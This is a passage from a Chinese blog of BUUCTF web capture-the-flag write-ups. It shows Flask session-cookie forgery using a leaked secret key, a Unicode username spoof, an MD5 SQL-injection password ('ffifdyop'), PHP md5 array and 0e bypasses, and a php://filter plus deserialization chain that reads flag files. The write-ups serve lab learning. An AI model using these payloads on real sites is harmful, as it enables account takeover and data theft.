class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //name变量存在于session中</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //如果是admin用户,登录后会直接显示flag</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code> flask</code>的<code>session</code>是存储在客户端<code>cookie</code>中的，而且<code>flask</code>仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而<code>flask</code>并没有提供加密操作，所以其<code>session</code>的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p></blockquote><p>可以使用脚本对<code>flask</code>的<code>session</code>进行解密和伪造:</p><p>注册一个名为<code>admin1</code>的账户并登录,抓包看到当前的<code>cookie</code>中的<code>session</code>值:</p><img src="/images/buuctf-web/image-20221016213837939-166704781973463.png" alt="image-20221016213837939" style="zoom:67%;" /><p>可以使用脚本对<code>session</code>进行解密:<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>用法:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py flask_session_cookie_manager3.py decode -c &quot;session值&quot; -s &quot;key值&quot;</span><br><span class="line">py flask_session_cookie_manager3.py encode -s &quot;key值&quot; -t &quot;我们需要伪造的值&quot;</span><br></pre></td></tr></table></figure><p>可以在<code>config.py</code>中找到<code>key</code>的值:<code>ckj123</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>用脚本: 首先使用<code>key</code>对<code>admin1</code>登录时的<code>session</code>值进行解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master&gt;py flask_session_cookie_manager3.py decode -c &quot;.eJw9kMFuwjAMhl9lypkD3egFiQNTCmqlJAKljZwLKrSQuDGT6CZoEe--DE2cP_vz__vOdsdL2zs2P9ahbyds5xs2v7O3PZszqT9RGRkAs1RpuFp03mLhAMWH4hVKUyGM5UzybrBYJmpdodAOLeUpkEiFFokYpZe6cNasgjUwSF6QNCuneJwz4ibHTdzNZ5YvZ2CqACZPJR5uYLZB6dMo3qtO0F-GolM8S8W4JdDOS2wQ9HKUVF6B8gV7TNihvxx3319de35VACqC5TZYnaWSCg8EU9Bl1G4GqbNBrGPEdaxGkeMmnq2cWi6eOk_1qX2ZmmlS2n9yrikCVjfkzwmbsJ--vTwfx5Ipe_wCfPRvAQ.Y0wFxw.Mk0P7kqa9AF6MQm6hSJpO1WQFhQ&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure><p>解密出来的值是一个字典: 可以看到里面有<code>admin1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb&#x27;, &#x27;csrf_token&#x27;: b&#x27;bbed6ee196bbbf4a533d25120c50f0fa9641aea8&#x27;, &#x27;image&#x27;: b&#x27;wMTd&#x27;, &#x27;name&#x27;: &#x27;admin1&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>那么为了伪造<code>admin</code>登录,将<code>admin1</code>改为<code>admin</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb&#x27;, &#x27;csrf_token&#x27;: b&#x27;bbed6ee196bbbf4a533d25120c50f0fa9641aea8&#x27;, &#x27;image&#x27;: b&#x27;wMTd&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>然后使用脚本对修改完的内容进行加密,同样需要用到<code>key</code>,加密之后得到一个新的<code>session</code>值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master&gt;py flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb&#x27;, &#x27;csrf_token&#x27;: b&#x27;bbed6ee196bbbf4a533d25120c50f0fa9641aea8&#x27;, &#x27;image&#x27;: b&#x27;wMTd&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br><span class="line">.eJw9kMFuwjAMhl9l8pkD3egFiQNTCmqlOAKljZwLKrSQpAmT6CZoEe--DE2cP_vz__sOu-Ol7Q3Mj7Xv2wnsbAPzO7ztYQ4oP51Q6MllqZB01c5Y7QpDjn8IVjlUlaOxnCHrBu3KRKwrx6VxOuQpBZ5yyRM-okVZGK1WXisakBUB1coIFucUv-G4ibv5TLPljFTlSeUpusON1NYLeRr5e9Xx8Jeh6ATLUj5uA0lj0TWO5HLEUF4p5At4TODQX46776-uPb8qUCi8ZtprmaUYCkuBpiTLqN0MKLOBr2PEdawWInebeLYyYrl46myoT-3L1EyTUv-Tcx0igLoJ9gwT-Onby_NvkEzh8QsPi27Q.Y0wG7Q.BnqQ4DVzGAf6kiiYR_i5k9_YwLQ</span><br></pre></td></tr></table></figure><p>将这个新的值替换到<code>cookie</code>中,就完成了<code>session</code>伪造,成功伪装成了<code>admin</code>登录,拿到flag</p><img src="/images/buuctf-web/image-20221016213048788-166704781973465.png" alt="image-20221016213048788" style="zoom:67%;" /><br><h2 id="另一种解法-unicode欺骗"><a href="#另一种解法-unicode欺骗" class="headerlink" title="另一种解法:unicode欺骗"></a>另一种解法:unicode欺骗</h2><p>在源码的<code>route.py</code>中可以找到网站的注册和登录逻辑:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/edit&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">error</span>):</span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlower</span>(<span class="params">username</span>):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>注意到,<code>register</code>,<code>login</code>和<code>change</code>函数中都用到了最下面定义的<code>strlower</code>函数,用来将<code>username</code>的值转化为小写</p><p>如果注册的时候用户名使用<code>ADMIN</code>,那么在注册完成时就会被转化成<code>admin</code></p><p>但是<code>nodeprep.prepare</code>在处理<code>ᴬ</code>这种特殊字符时,会将其转化为大写字母,也就是<code>A</code></p><p>因此,在注册是可以使用<code>ᴬdmin</code>这个用户名,在注册成功时,这个用户名被转化为了<code>Admin</code>,这样就和原有的<code>admin</code>有了区别,从而能够成功注册, 同时,在使用<code>Admin</code>登录时还会调用一次<code>nodeprep.prepare</code>函数, 因此登录进去的时候就变成了<code>admin</code>,从而拿到flag</p><img src="/images/buuctf-web/image-20221016220028090-166704781973567.png" alt="image-20221016220028090" style="zoom:67%;" /><br><hr><br><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>抓包之后看到了提示:</p><img src="/images/buuctf-web/image-20221016221105336-166704781973566.png" alt="image-20221016221105336" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)//这里参数true的意思是输出格式为二进制格式</span><br></pre></td></tr></table></figure><p>传进去的参数被计算了md5值,那么需要被计算md5后还能达到注入效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure><p>这两个值在生成二进制的<code>md5</code>后可以包含<code>...&#39; or .. </code>这样的<strong>万能密码</strong></p><p>用上面这个个值登录进去后,查看源码可以看到下一条提示:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="数组绕过md5"><a href="#数组绕过md5" class="headerlink" title="数组绕过md5"></a>数组绕过md5</h2><p>这里需要a和b的值不相等,但是<code>md5</code>计算结果相等,<strong>这里传数组就可以,php中数组经过md5计算的值为<code>NULL</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/levels91.php?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p>然后来到了下一个提示: 和刚才如出一辙,还是传数组就可以:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221016222416913-166704781973568.png" alt="image-20221016222416913" style="zoom:67%;" /><h2 id="0e绕过md5"><a href="#0e绕过md5" class="headerlink" title="0e绕过md5"></a>0e绕过md5</h2><p>另外一种方法: </p><p><code>0e</code>开头的字符串在参与比较时,<strong>会被当做科学计数法</strong>,结果转换为0,因此,下面两个数的比较:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0e830400451993494058024219903391 == 0e462097431906509019562988736854</span><br><span class="line">会被视为:</span><br><span class="line">0==0 从而返回True</span><br></pre></td></tr></table></figure><p>那么这种方法也可以用来绕过<code>md5</code>值的比较:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708) 这两者计算md5的结果都是0e开头的,所以这里会判定为True</span><br></pre></td></tr></table></figure><p><code>md5</code>计算后以<code>0e</code>开头的值还包括:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">byGcY</span><br><span class="line">sonZ7y</span><br><span class="line">aabg7XSs</span><br><span class="line">aabC9RqS</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s1091221200a</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>伪协议+反序列化</p><p>这题直接给源码了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>第一步,需要让<code>text</code>参数的值等于某个文件名,然后从该文件中还要读取到”welcome to the zjctf”</p><p>这里可以使用<code>data</code>伪协议(通常用来执行代码): <strong>相当于让<code>file_get_contents</code>从<code>data</code>的流中读取数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0e27bf5-f2af-4d14-8542-148fd03d2e29.node4.buuoj.cn:81/index.php?text=data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221016230039673-166704781973569.png" alt="image-20221016230039673" style="zoom:67%;" /><p>接下来需要给<code>file</code>传值,先用<code>php</code>伪协议来读一下提示里<code>useless.php</code>的源码试试:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>把输出的内容解码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>结合前面的代码,<code>password</code>的值会被反序列化,生成一个这里<code>Flag</code>类的实例. 而前面<code>echo $password</code>时,则会触发这里的<code>__tostring</code>魔术方法, 根据参数<code>file</code>的值去读文件,那么显然可以将它的值设为<code>flag.php</code></p><p>所以现在在本地创建一个<code>Flag</code>类的实例,并将其<code>file</code>属性赋值为<code>flag.php</code>,最后将其序列化:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span 